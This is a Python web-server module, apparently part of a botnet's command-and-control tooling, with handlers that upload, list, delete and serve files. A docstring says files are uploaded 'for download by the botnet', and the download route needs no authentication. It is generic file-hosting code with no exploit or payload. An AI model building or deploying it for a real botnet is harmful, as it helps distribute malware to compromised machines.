import logging, uuid, datetime, re, os, secrets
from wsgiref.util import FileWrapper

from util import BaseHandler, engine, requires_params, verify_peer
import models

from sqlalchemy.orm import sessionmaker
from sqlalchemy import desc
Session = sessionmaker(bind=engine)

logger = logging.getLogger(__name__)
logging.basicConfig(level=logging.INFO)


class access_db:
    """Wrapper class for accessing the database.

    This automatically closes database connectiosn on completion,
    and is designed solely for convenience.

    Example:
    with access_db() as conn:
        my_obj = do_stuff()
        db_conn.add(my_obj)
        db_conn.commit()
    """

    def __enter__(self):
        """Connects to the database and returns the connection as part of the setup process."""
        self.db_conn = Session()
        return self.db_conn

    def __exit__(self, type, value, traceback):
        """Closes the db connection as part of the teardown process."""
        self.db_conn.close()

class Upload(BaseHandler):
    """Upload a file for download by the botnet."""
    @verify_peer()
    def put(self):
        logger.info(f'{self.base_request} /upload')
        content_body = self.request.body
        marker = content_body.split(b'\r\n', 1)[0]
        all_content = [x.strip() for x in content_body.split(marker)[1:-1]]
        form_data = [x.split(b'\r\n\r\n') for x in all_content]
        uploaded_file = None
        uploaded_filename = None
        op_name = None
        for element in form_data:
            m = re.search(b'name="([^"]+)"', element[0])
            try:
                if m[1] == b'file':
                    uploaded_file = element[1]
                    m = re.search(b'filename="([^"]+)"', element[0])
                    uploaded_filename = m[1].decode('utf-8')
                if m[1] == b'op_name':
                    op_name = element[1].decode('utf-8')
            except Exception as e:
                logger.warn(e)

        local_filename = self.generate_filename()
        generated_uuid = uuid.uuid4()

        with open(local_filename, 'wb') as f:
            f.write(uploaded_file)

        try:
            with access_db() as db_conn:
                upload = models.Upload(
                    guid=generated_uuid,
                    filename=uploaded_filename,
                    op_name=op_name,
                )
                upload.filepath = local_filename
                db_conn.add(upload)
                db_conn.commit()
                logger.info(f'New file: {upload.guid} -- {upload.filepath}')
        except:
            logger.warn(e)
            return self.HTTP_404()

        data = {
            'guid': str(generated_uuid)
        }
        
        return self.HTTP_200(data=data)

    def generate_filename(self):
        curr_folder = os.path.dirname(os.path.abspath(__file__))
        return f'{curr_folder}/uploaded_files/tmp_{secrets.token_hex(8)}'

class Delete(BaseHandler):
    @verify_peer()
    def post(self):
        file_id = uuid.UUID(self.request.data['file'])
        with access_db() as db_conn:
            file_to_delete = db_conn.query(models.Upload).\
                filter_by(guid=file_id).first()
            if file_to_delete:
                print(file_to_delete)
                db_conn.delete(file_to_delete)
                db_conn.commit()
                return self.HTTP_200()
            else:
                return self.HTTP_404()
    
class FetchFiles(BaseHandler):
    @verify_peer()
    def get(self):
        with access_db() as db_conn:
            all_files = db_conn.query(models.Upload).all()
            all_files = [{'guid': str(x.guid), 'op_name': x.op_name, 'filename': x.filename} for x in all_files]
            #print(all_files)
            return self.HTTP_200(data={'files':all_files})

class Download(BaseHandler):
    def get(self, file_id):
        """Download a file from the server."""
        logger.info(f'{self.base_request} /download/{file_id}')

        wrapper = None
        
        with access_db() as db_conn:
            try:
                file_uuid = uuid.UUID(file_id)
                file_obj = db_conn.query(models.Upload).\
                    filter(models.Upload.guid==file_uuid).\
                    first()
                if not file_obj:
                    return self.HTTP_404()
            except Exception as e:
                logger.warn(e)
                return self.HTTP_404()
            else:
                try:
                    wrapper = FileWrapper(open(file_obj.filepath, 'rb'))
                    file_length = str(os.path.getsize(file_obj.filepath))
                    self.response.set_header('Content-Type', 'application/octet-stream')
                    self.response.set_header('Content-Length', str(os.path.getsize(file_obj.filepath)))
                    self.response.set_header('Accept-Ranges', 'bytes')
                    return wrapper
                except Exception as e:
                    logger.warn(e)
                    return self.HTTP_404()

routes = [
    ('/files', FetchFiles()),
    ('/files/upload', Upload()),
    ('/files/delete', Delete()),
    ('/files/download/([0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12})', Download()),
]
